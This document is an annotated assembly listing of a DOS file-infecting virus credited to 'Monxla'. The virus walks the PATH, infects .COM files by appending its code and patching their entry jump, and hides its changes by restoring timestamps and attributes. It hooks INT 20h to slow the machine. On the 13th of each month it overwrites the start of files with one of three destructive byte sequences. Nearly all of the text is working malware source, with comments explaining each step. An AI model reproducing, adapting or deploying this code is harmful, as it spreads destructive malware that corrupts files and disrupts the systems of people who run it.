; Start disassembly
DATA_1E         EQU 64H   ; (761D:0064=0)
DATA_2E  EQU 66H   ; (761D:0066=0)
DATA_3E  EQU 68H   ; (761D:0068=0)
DATA_10E EQU 4F43H   ; (761D:4F43=0)
DATA_11E EQU 504DH   ; (761D:504D=0)
  
SEG_A  SEGMENT
  ASSUME CS:SEG_A, DS:SEG_A
  
  
  ORG 100h
  
Time  PROC FAR
  
start:
  JMP Virus_Entry_Point ;

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Original Program without 1st three bytes...                          лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

DATA_5  DB 9987 DUP (90H)
  MOV AH,4CH   ;
  MOV AL,DATA_2  ; Terminate to DOS with 
  INT 21H   ; exitcode AL
  DB 0
DATA_2  DB 0
  DB 0

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Virus Entry Point                                                    лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Virus_Entry_Point:
  JMP SHORT Set_Virus_Data_Point  
  NOP

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Set Virus Data Storage Point                                         лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Set_Virus_Data_Point:
  PUSH CX   ; Store CX
  MOV DX,2B2DH  ;
  MOV SI,DX   ; SI points at start of
      ; virus data

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Get DTA Address                                                      лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл


  PUSH ES   ; Store ES
  MOV AH,2FH   ; GET DTA address into
  INT 21H   ; ES:BX
  MOV [SI],BX   ; Store BX of DTA
  MOV [SI+2],ES  ; Store ES of DTA
  POP ES   ; Restore ES

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Set new DTA Address                                                  лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

  MOV DX,4EH   ;
  ADD DX,SI   ; 
  MOV AH,1AH   ; 
  INT 21H   ; Set new DTA to DS:DX

  PUSH SI   ; Store SI
  CLD    ; Clear direction
  MOV DI,SI   ; 
  ADD SI,0AH   ;
  ADD DI,81H   ;
  MOV CX,3   ; Move 3 bytes from source 
  REP MOVSB   ; to destination (E9h, 45h
      ; 45h)
  POP SI   ; Restore SI

  PUSH ES   ; Store ES
  PUSH SI   ; Store SI
  PUSH BX   ; Store BX
  MOV BX,2CH   
  MOV AX,[BX]   ; Get Extra Segment?
  POP BX   ; Restore BX
  MOV ES,AX
  MOV DI,0

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Search for the PATH                                                  лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Search_For_Path:
  POP SI   ; Restore SI
  PUSH SI   ; Store SI
  ADD SI,1AH   ;
  LODSB    ; Load the 'M' into AL
  MOV CX,8000H  ;
  REPNE SCASB   ; 
  MOV CX,4   ;
 Path_Loop:
  LODSB    ; 
  SCASB    ; 
  JNZ Search_For_Path  ; 
  LOOP Path_Loop  ; Pitty, PATH not yet found.
  
  POP SI   ; Restore SI
  POP ES   ; Restore ES
  MOV [SI+16H],DI  ; Store address of PATH
  MOV BX,SI   ; Temp. Storage of SI
  ADD SI,26H   ;
  MOV DI,SI   ; 
  JMP SHORT Find_First_FileName
  NOP

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл                                                                      лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Error:
  CMP WORD PTR [SI+16H],0
  JNE Set_Virus_Path  ; 
  JMP Restore_Org_DTA  ; Error occured. Restore
      ; original DTA,
      ; 1st three bytes and
      ; execute original
      ; program.

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Start Searching for PATH                                             лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Set_Virus_Path:
  PUSH DS   ; Store Registers
  PUSH SI
  PUSH AX
  PUSH ES
  PUSH ES
  POP DS   ; DS=ES
  PUSH BX
  MOV BX,2CH
  MOV AX,[BX]
  POP BX   ; Restore BX
  MOV [SI+1FH],AX  ; 
  MOV DI,SI   ;
  MOV AX,[DI+16H]  ; Org.address of PATH
  MOV SI,AX   ;
  MOV DS,[DI+1FH]  ;
  POP ES   ;
  POP AX   ;
  ADD DI,26H   ; 
Reached_EO_Path:
  LODSB    ; Get byte into AL
  CMP AL,3BH   ; Path Delimiter ';' reached? 
  JE Delimiter_Reached ; Yes
  CMP AL,0   ; End of Path reached?
  JE EO_Path_Reached  ; Yes
  STOSB    ; Store byte in AL
  JMP SHORT Reached_EO_Path ; 
EO_Path_Reached:
  MOV SI,0   ;
Delimiter_Reached:
  POP BX   ;
  POP DS   ;
  MOV [BX+16H],SI  ; 
  CMP BYTE PTR [DI-1],5CH ; Is the PATH closed by
      ; a backslash? 
  JE Find_First_FileName ; Yes
  MOV AL,5CH   ; 
  STOSB    ; Place Backslash

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Find First Filename                                                  лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Find_First_FileName:
  MOV [BX+18H],DI  ; Store at which address
      ; the path starts
      ; BX=SI
  MOV SI,BX   ; Restore SI
  ADD SI,10H   ; 
  MOV CX,6   ;
  REP MOVSB   ; Set Search.Spec.
  MOV SI,BX   ; Restore SI

  MOV AH,4EH   ; 
  MOV DX,26H   ;
  ADD DX,SI   ; Filename:= *.COM
  MOV CX,3   ; Search Attributes:
      ; Read Only/Hidden
  INT 21H   ; Find 1st Filename to
      ; match with DS:DX
  JMP SHORT Error_Handler ; 
  NOP

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Find Next Filename                                                   лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Find_Next_FileName:
  MOV AH,4FH   ; 
  INT 21H   ; Find next Filename to
      ; match with DS:DX

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Error Handler                                                        лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Error_Handler:
  JNC Check_Filelength ; Jump if carry=0, so
      ; no errors
  JMP SHORT Error  ; Carry Set, so error
      ; occured

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Check Filelength and look if file is already infected.               лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл


Check_Filelength:
  MOV AX,DS:DATA_1E[SI] ; (761D:0064=0)
  AND AL,1FH
  CMP AL,7
  JE Find_Next_FileName ; File already infected.
  CMP WORD PTR DS:DATA_3E[SI],0FA00H
      ; Is the length of the
      ; file more as FA00h bytes?
  JA Find_Next_FileName ; Yes.
  CMP WORD PTR DS:DATA_3E[SI],0F00H 
      ; Is the length of the
      ; file less as 0F00h bytes?
  JB Find_Next_FileName ; Yes
  MOV DI,[SI+18H]  ; Get address of path of virus
  PUSH SI   ; Store SI
  ADD SI,6CH   
Set_FileName:
  LODSB    ; Set up Filename for 
  STOSB    ; infection.
  CMP AL,0   ; End Of Filename Reached?
  JNE Set_FileName  ; No

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Set Temporary File attributes                                        лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

  POP SI   ; Restore SI
  MOV CX,[SI+63H]  ; 
  MOV CH,0   ;
  MOV [SI+8],CX  ; Get File-Attributes
  MOV AX,CX   ;
  MOV CX,0FFFEH  ; 
  AND AX,CX   ; Remove Read-Only Attribute
  MOV CX,AX   ;
  MOV AX,4301H  ;
  MOV DX,26H   ;
  ADD DX,SI   ;
  INT 21H   ; Set File-Attributes

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Open the File                                                        лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

  MOV AX,3D02H  ; Open the file for both
  INT 21H   ; reading and writing
  JNC Give_Infection_Marker ; If no error occured...
  JMP Set_FileAttributes_Back ; Error occured

Give_Infection_Marker:
  MOV BX,AX
  MOV CX,DS:DATA_2E[SI] ; (761D:0066=0)
  MOV [SI+6],CX
  MOV CX,DS:DATA_1E[SI] ; (761D:0064=0)
  AND CL,0E0H
  OR CL,7
  MOV [SI+4],CX
  JMP SHORT Get_Current_Time ; (2967)
  NOP

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл This Part will be installed resident after hooking INT 20h           лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

  PUSHF    ; Push flags
  PUSH DS
  PUSH ES
  PUSH SS
  PUSH AX
  PUSH BX
  PUSH DX
  PUSH DI
  PUSH SI
  PUSH BP
  MOV DX,43H
  MOV AL,74H   ; This will change the refesh
  OUT DX,AL   ; rate, thus slowing down the
  MOV DX,41H   ; PC. Every normal program-
  MOV AL,8   ; termination by calling
  OUT DX,AL   ; INT 20h will call this 
  MOV AL,7   ; rourtine
  OUT DX,AL   ; 
  POP BP
  POP SI
  POP DI
  POP DX
  POP BX
  POP AX
  POP SS
  POP ES
  POP DS
  POPF    ; Pop flags
  JMP CS:DATA_5   ; (761D:0253=9090H)
      ; JMP to org. INT 20h address
  ADD [BX+SI],AL
  ADD [BX+SI],AL

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Get Current Time                                                     лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Get_Current_Time:
  PUSH AX   ; Store all registers
  PUSH BX
  PUSH CX
  PUSH DX
  PUSH DS
  PUSH ES
  PUSH SI
  PUSH DI
  PUSH BP
  MOV AH,2CH   ; Get current time into CX:DX
  INT 21H   ; CX=hrs/min, DX=sec/hund.sec
  CMP DL,32H   ; Are we above 32/100 seconds?
  JA Get_INT_F2_Vector ; Yes
  JMP Start_Trigger_Check ; No

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Get Interrupt Vector of INT F2h                                      лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Get_INT_F2_Vector:
  MOV AH,35H   ; Get the interrupt vector of
  MOV AL,0F2H   ; INT 0F2h into ES:BX
  INT 21H   ; 

  CMP BX,7777H  ; Was INT F2 already hooked?
      
  JNE Allocate_Memory  ; No
  JMP INT_F2_Already_Hooked ; 
Allocate_Memory:
  MOV AX,DS   ;
  DEC AX   ;
  MOV ES,AX   ;
  MOV BX,0   ;
  CMP BYTE PTR ES:[BX],5AH ; 
  JE Memory_Already_Allocated  
  PUSH BX   ;
  MOV AH,48H   ; Allocate 4096 16-byte-para-
  MOV BX,0FFFFH  ; graphs in memory. ???
  INT 21H   ; 
  CMP BX,5   ; Is the largest available
      ; 5 or higher?
  JAE Again_Allocate_Memory ; Yes
  JMP Start_Trigger_Check   ; No
Again_Allocate_Memory:
  MOV AH,48H   ; Again allocate memory
  INT 21H   ; 
  POP BX   ;
  JNC Segment_Decrease ; If there was no error when
      ; allocating memory the last
      ; time
  JMP Start_Trigger_Check ; If there was an error
Segment_Decrease:
  DEC AX   ; Decrease Segment of Allcated
      ; memory
  MOV ES,AX   ;
  MOV BX,1   ;
  MOV WORD PTR ES:[BX],0 ;
  MOV BX,0   ;
  CMP BYTE PTR ES:[BX],5AH ;
  JE Memory_Allocated ;
  JMP SHORT Start_Trigger_Check  
  NOP    ;
Memory_Allocated:
  MOV BX,3   ;
  ADD AX,ES:[BX]  ;
  INC AX   ;
  MOV BX,12H   ;
  MOV ES:[BX],AX  ;
Memory_Already_Allocated: 
  MOV BX,3   ;
  MOV AX,ES:[BX]  ;
  SUB AX,5   ;
  JC Start_Trigger_Check ; Jump if carry Set
  MOV ES:[BX],AX  ;
  MOV BX,12H   ;
  SUB WORD PTR ES:[BX],5 ;
  MOV ES,ES:[BX]  ;
  PUSH SI   ; Store SI
  SUB SI,1F2H   ; SI points to the part
  MOV DI,0   ; which must become
  MOV CX,46H   ; resident.
  REP MOVSB   ; Move the 46h bytes from
      ; [SI] to ES:[DI]
  POP SI   ; Restore SI
  MOV BP,ES   ;
  PUSH CS   ;
  POP ES   ; Restore ES

  MOV AH,25H   ; Hook interrupt F2h
  MOV AL,0F2H   ; New INT-vector will
  MOV DX,7777H  ; be DS:7777h
  INT 21H   ; 
  JMP SHORT Hook_INT_20h ; (2A10)
  NOP

INT_F2_Already_Hooked:
  JMP SHORT Start_Trigger_Check  
  NOP
Hook_INT_20h:
  MOV AL,20H   ; 
  MOV AH,35H   ; Get the INT 20h Vector
  INT 21H   ; into ES:BX

  MOV DX,ES   ;
  MOV ES,BP   ;
  PUSH SI   ;
  MOV AX,SI   ;
  SUB AX,1CAH   ;
  MOV DI,SI   ;
  SUB DI,1F2H   ;
  SUB AX,DI   ;
  MOV SI,AX   ;
  MOV ES:[SI],BX  ;
  ADD SI,2   ;
  MOV ES:[SI],DX  ;
  SUB SI,4   ;
  MOV ES:[SI],AX  ;
  POP SI   ;
  PUSH CS   ;
  POP ES   ;

  MOV AH,25H   ; Install new INT 20h
  MOV DS,BP   ; vector to DS:DX
  MOV DX,0   ; (=DS:00)
  MOV AL,20H   ; 
  INT 21H   ; 

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Start Trigger Check                                                  лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Start_Trigger_Check:
  POP BP   ; Restore Registers
  POP DI
  POP SI
  POP ES
  POP DS
  POP DX
  POP CX
  POP BX
  POP AX
  MOV AH,2AH   ; Get the current date 
  INT 21H   ; CX=year, DX=mon/day
  CMP DL,0DH   ; Is it the 13th of the month?
  JNE Start_Infecting_File ; No

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл  It is the 13th of the Month... Select 1 out of 3 destructions       лл 
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

  MOV AH,2CH   ; Get current time
  INT 21H   ; CX=hrs/min, DX=sec/hund.sec
  CMP DL,3CH   ; Are we above 60/100 seconds?
  JA Destruction_2  ; Yes
  CMP DL,1EH   ; Are we above 30/100 seconds?
  JA Destruction_3  ; Yes

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Destruction Scheme 1: Place the following code at the begining of a  лл
;лл file: MOV AH,00                                                      лл
;лл       INT 20h                                                        лл
;лл       NOP                                                            лл
;лл                                                                      лл
;лл When a file is executed with this code at the begining, the program  лл
;лл will terminate at once with returning to DOS.                        лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

  MOV DX,SI
  ADD DX,21H
  JMP SHORT Write_5_Destruction_Bytes  
  NOP

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Destruction Scheme 2: Place the following code at the begining of a  лл
;лл file: HLT                                                            лл
;лл       HLT                                                            лл
;лл       HLT                                                            лл
;лл       HLT                                                            лл
;лл       DB  CDh (which is the opcode for INT)                          лл
;лл                                                                      лл
;лл When a file is executed with this code at the begining, the program  лл
;лл will execute the 4 HLT's and then perform an INT-Call depending on   лл
;лл the byte following CDh. This can be any INT-Call. So this scheme     лл
;лл can be consisered the dangeroust of all three destruction schemes.   лл
;лл will terminate at once with returning to DOS. The first five bytes   лл
;лл of a file will be overwritten always, making the file useless, but   лл
;лл issuing and 'random' INT-Call can do much more harm.                 лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Destruction_2:
  MOV DX,SI
  ADD DX,79H
  JMP SHORT Write_5_Destruction_Bytes  
  NOP

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Destruction Scheme 3: Place the following code at the begining of a  лл
;лл file: INT 19h                                                        лл
;лл       INT 19h                                                        лл
;лл       DB  ?    (Can be anything. It is the 1st byte of the org.file) лл
;лл                                                                      лл
;лл When a file is executed with this code at the begining, the program  лл
;лл will cause a reboot without a memory test and preserving the         лл
;лл interrupt vectors. If any interrupt vector from 00h through 1Ch has  лл
;лл been set, the system most likely will hang itself, because of this   лл
;лл preserving.                                                          лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Destruction_3:
  MOV DX,SI
  ADD DX,7DH
  JMP SHORT Write_5_Destruction_Bytes  
  NOP

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Write the 5 bytes with the destruction to the begining of the file   лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Write_5_Destruction_Bytes:
  MOV AH,40H   ; 
  MOV CX,5   ;
  INT 21H   ; Write 5 bytes to the file
  JMP SHORT Set_FileDate_Time_Back 
  NOP

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл It is not the 13th of the month... Infect the file                   лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Start_Infecting_File:
  MOV AH,3FH   ; 
  MOV CX,3   ; Number of bytes to read
  MOV DX,0AH   ;
  ADD DX,SI   ;
  INT 21H   ; Read the bytes from the file
      ; and put them at DS:DX
  JC Set_FileDate_Time_Back ; If Error Occurred
  CMP AL,3   ; 3 Bytes read?
  JNE Set_FileDate_Time_Back ; No


  MOV AX,4202H  ; Set the Read/Write 
  MOV CX,0   ; pointer to the EOF at 
  MOV DX,0   ; offset CX:DX (=00:00)
  INT 21H   ; 

  MOV CX,AX   ; CX=Length of File
  SUB AX,3   ;
  MOV [SI+0EH],AX  ; Store Length -3 bytes
  ADD CX,41DH   ; CX=CX+41Dh
  MOV DI,SI
  SUB DI,318H
  MOV [DI],CX   ; Set new Virus Data Area
      ; Address into code
  MOV AH,40H   ; 
  MOV CX,3ABH   ; CX=3ABh The length of the
      ; viral-code written to disk.
  MOV DX,SI
  SUB DX,31DH   ; DX points at the start of
      ; the virus code
  INT 21H   ; Write the viral-code to the
      ; file

  JC Set_FileDate_Time_Back ; If an error occured
  CMP AX,3ABH   ; 3ABh bytes written?
  JNE Set_FileDate_Time_Back ; No
  MOV AX,4200H  ; Move Read/Write Pointer to
  MOV CX,0   ; the beginning of the file
  MOV DX,0   ; at offset CX:DX(=00:00)
  INT 21H   ; 

  MOV AH,40H   ; Write the 1st three new 
  MOV CX,3   ; bytes to the file. These
  MOV DX,SI   ; bytes contain the JMP
  ADD DX,0DH   ; instruction to the virus.
  INT 21H   ; 

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Set File-Time/Date back                                              лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Set_FileDate_Time_Back:
  MOV DX,[SI+6]  ; Get File-Date
  MOV CX,[SI+4]  ; Get File-Time
  MOV AX,5701H  ; Set back the File-Time and
  INT 21H   ; Date stamps

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Close the File                                                       лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

  MOV AH,3EH   ; 
  INT 21H   ; Close the File

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Set File Attribute back                                              лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл


Set_FileAttributes_Back:
  MOV AX,4301H  ;
  MOV CX,[SI+8]  ; Get File Attribute
  MOV DX,26H   ;
  ADD DX,SI   ; 
  INT 21H   ; Set File Attribute

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Restore Org DTA address                                              лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

Restore_Org_DTA:
  PUSH DS
  MOV AH,1AH
  MOV DX,[SI]   ; Get Original DTA
  MOV DS,[SI+2]  ; address
  INT 21H   ; St DTA to ds:dx

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Put 3 Original 1st three bytes in place and execute original program лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

  POP DS   ; Restore DS
  PUSH SI   ; Store SI
  CLD    ; 
  ADD SI,81H   ; Address where the 1st three
      ; bytes can be found.
  MOV DI,100H   ; Destination Address
  MOV CX,3   ; Number of bytes to move
  REP MOVSB   ; Move the bytes
  POP SI   ; Restore SI
  POP CX   ; Restore CX
  XOR AX,AX   ; Zero register
  XOR BX,BX   ; Zero register
  XOR DX,DX   ; Zero register
  XOR SI,SI   ; Zero register
  MOV DI,100H   
  PUSH DI   ; Store DI
  XOR DI,DI   ; Zero register
  RET 0FFFFH   ; Terminate Virus-Code and
      ; execute original program.

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                                      лл
;лл Virus Data Area                                                      лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл


ORG_DTA_ADD: DW ?   ; Storing place for BX of 
      ; original DTA
  DW ?   ; Storing place for ES of
      ; original DTA
File_Time: DW ?   ; Storing place for the
      ; filetime of the file
Date:  DW ?   ; Storing place for the
      ; filedate 
Attrib:  DW ?   ; Storing place for the
      ; file attributes.

Three_Bytes: DB 0E9h, 27h, 03h

First_New_Byte: DB 0E9h   ; First new byte of the 
      ; the infected file. This is
      ; the jump instruction.
Length_Min_3: DB 0Dh, 27h  ; Also new address to jump
      ; to for the virus on exe-
      ; cution, 2nd and 3rd new byte

Search_Spec: DB '*.COM',00h
  
Path_Add_Org: DW 00,05

Path_Add_Vir: DW '6M'

  DB 'PATH=', 00, 00

Destruc_Code_1: DB 0B4h, 0h, 0CDh, 20h, 90h

File_Path: DB 'VIRCOM.COM'  ; Filename including PATH
  DB 30 DUP(0)

New_DTA: 
    DB 02
  DB '????????COM'
  DB 03, 11H
  DB 7 DUP (0)
  DB 20H, 80H, 12H, 17H, 15H, 10H
  DB 27H, 0, 0

FileName: DB 'VIRCOM.COM', 00h, 00h, 00h

Destruc_Code_2: DB 0F4H, 0F4H, 0F4H, 0F4H

Destruc_Code_3: DB 0CDH, 19H, 0CDH, 19H, 0E9H
 
First_3_Bytes: DB 0E9h, 45h, 45h

Notice:  DB '(C) Monxla'
  
Time  ENDP
  
SEG_A  ENDS
  


  END START
